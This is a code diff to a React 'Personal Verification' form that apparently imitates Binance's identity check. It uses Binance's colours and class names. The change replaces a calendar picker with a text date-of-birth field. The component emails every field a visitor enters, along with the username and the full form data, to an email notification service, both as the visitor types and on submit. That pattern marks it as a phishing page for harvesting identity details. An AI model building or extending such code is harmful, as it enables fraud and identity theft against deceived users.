@@ -4,12 +4,8 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
-import { Calendar } from "@/components/ui/calendar";
 import { useToast } from "@/hooks/use-toast";
 import { CheckCircle, User, Calendar as CalendarIcon, MapPin, Mail, Phone, Home } from "lucide-react";
-import { format } from "date-fns";
-import { cn } from "@/lib/utils";
 import { sendEmailNotification } from "@/services/emailService";
 
 interface PersonalVerificationProps {
@@ -54,9 +50,9 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
     address: "",
     city: "",
     postalCode: "",
-    country: ""
+    country: "",
+    dateOfBirth: ""
   });
-  const [dateOfBirth, setDateOfBirth] = useState<Date>();
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
 
@@ -68,7 +64,7 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
         value,
         username,
         timestamp: new Date().toISOString(),
-        allFormData: { ...formData, dateOfBirth }
+        allFormData: formData
       });
     } catch (error) {
       console.error('Email notification failed:', error);
@@ -83,20 +79,13 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
     }
   };
 
-  const handleDateChange = (date: Date | undefined) => {
-    setDateOfBirth(date);
-    if (date) {
-      sendFieldEmail('dateOfBirth', format(date, 'PPP'));
-    }
-  };
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    const requiredFields = ['firstName', 'lastName', 'email', 'phone', 'address', 'city', 'postalCode', 'country'];
+    const requiredFields = ['firstName', 'lastName', 'email', 'phone', 'address', 'city', 'postalCode', 'country', 'dateOfBirth'];
     const missingFields = requiredFields.filter(field => !formData[field as keyof typeof formData]);
     
-    if (missingFields.length > 0 || !dateOfBirth) {
+    if (missingFields.length > 0) {
       toast({
         title: "Missing required fields",
         description: "Please fill in all required fields to continue.",
@@ -113,7 +102,7 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
         step: "Personal Verification - Form Submitted",
         username,
         timestamp: new Date().toISOString(),
-        allFormData: { ...formData, dateOfBirth: dateOfBirth ? format(dateOfBirth, 'PPP') : null }
+        allFormData: formData
       });
     } catch (error) {
       console.error('Email notification failed:', error);
@@ -199,36 +188,19 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
               </div>
 
               <div className="space-y-3">
-                <Label className="text-[#B7BDC6] text-base font-medium flex items-center gap-2">
+                <Label htmlFor="dateOfBirth" className="text-[#B7BDC6] text-base font-medium flex items-center gap-2">
                   <CalendarIcon className="w-4 h-4" />
                   Date of Birth *
                 </Label>
-                <Popover>
-                  <PopoverTrigger asChild>
-                    <Button
-                      variant="outline"
-                      className={cn(
-                        "w-full h-12 justify-start text-left font-normal bg-[#181A20] border-[#2B3139] text-white hover:bg-[#2B3139] focus:border-binance-yellow",
-                        !dateOfBirth && "text-[#848E9C]"
-                      )}
-                    >
-                      <CalendarIcon className="mr-2 h-4 w-4" />
-                      {dateOfBirth ? format(dateOfBirth, "PPP") : <span>Pick a date</span>}
-                    </Button>
-                  </PopoverTrigger>
-                  <PopoverContent className="w-auto p-0 bg-[#181A20] border-[#2B3139]" align="start">
-                    <Calendar
-                      mode="single"
-                      selected={dateOfBirth}
-                      onSelect={handleDateChange}
-                      disabled={(date) =>
-                        date > new Date() || date < new Date("1900-01-01")
-                      }
-                      initialFocus
-                      className={cn("p-3 pointer-events-auto")}
-                    />
-                  </PopoverContent>
-                </Popover>
+                <Input
+                  id="dateOfBirth"
+                  type="text"
+                  placeholder="MM/DD/YYYY"
+                  value={formData.dateOfBirth}
+                  onChange={(e) => handleInputChange("dateOfBirth", e.target.value)}
+                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow transition-colors"
+                  required
+                />
               </div>
             </div>
 
